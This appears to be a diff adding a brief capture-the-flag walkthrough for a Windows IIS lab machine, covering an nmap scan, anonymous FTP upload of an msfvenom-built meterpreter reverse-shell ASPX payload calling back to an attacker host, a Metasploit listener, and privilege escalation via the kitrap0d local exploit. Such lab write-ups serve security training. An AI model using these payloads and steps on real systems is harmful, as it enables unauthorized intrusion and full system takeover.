@@ -1,0 +1,74 @@
+Scanning 
+
+Nmap -A 10.10.10.5
+
+Option -A enable :
+	- version detection
+	- OS detection
+	- script scanning
+	- traceroute
+
+nmap -A  10.10.10.5
+
+PORT     STATE SERVICE            VERSION
+21/tcp   open  ftp                Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 03-18-17  02:06AM       <DIR>          aspnet_client
+| 06-12-22  11:53AM                 2905 devel.aspx
+| 03-17-17  05:37PM                  689 iisstart.htm
+|_03-17-17  05:37PM               184946 welcome.png
+80/tcp   open  http               Microsoft IIS httpd 7.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: IIS7
+3389/tcp open  ssl/ms-wbt-server?
+|_ssl-date: 2022-06-13T02:36:57+00:00; -5s from scanner time.
+| ssl-cert: Subject: commonName=devel
+| Not valid before: 2022-06-11T09:45:58
+|_Not valid after:  2022-12-11T09:45:58
+| rdp-ntlm-info: 
+|   Target_Name: DEVEL
+|   NetBIOS_Domain_Name: DEVEL
+|   NetBIOS_Computer_Name: DEVEL
+|   DNS_Domain_Name: devel
+|   DNS_Computer_Name: devel
+|   Product_Version: 6.1.7600
+|_  System_Time: 2022-06-13T02:36:55+00:00
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Notice :
+	- Anonymous FTP login allowed
+
+
+Create payload :
+
+	- Msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip_attacker LPORT=4444 -f aspx -o shell.aspx
+
+Login ftp and upload your payload (shell.aspx)
+
+	- Put shell.aspx
+
+Open metasploit and use multi/handler and set payload , LPORT , LHOST 
+
+Notice payload is  windows/meterpreter/reverse_tcp
+
+Run listener 
+
+Command run -j
+
+open url "http://10.10.10.5/shell.aspx" in browser and view page source
+
+
+you gained access
+
+
+Privilege escalation 
+
+
+Use post/multi/recon/local_exploit_suggester and set session number and run after that 
+use exploit/windows/local/ms10_015_kitrap0d and set session number and LHOST
+
+You have a shell as Administrator
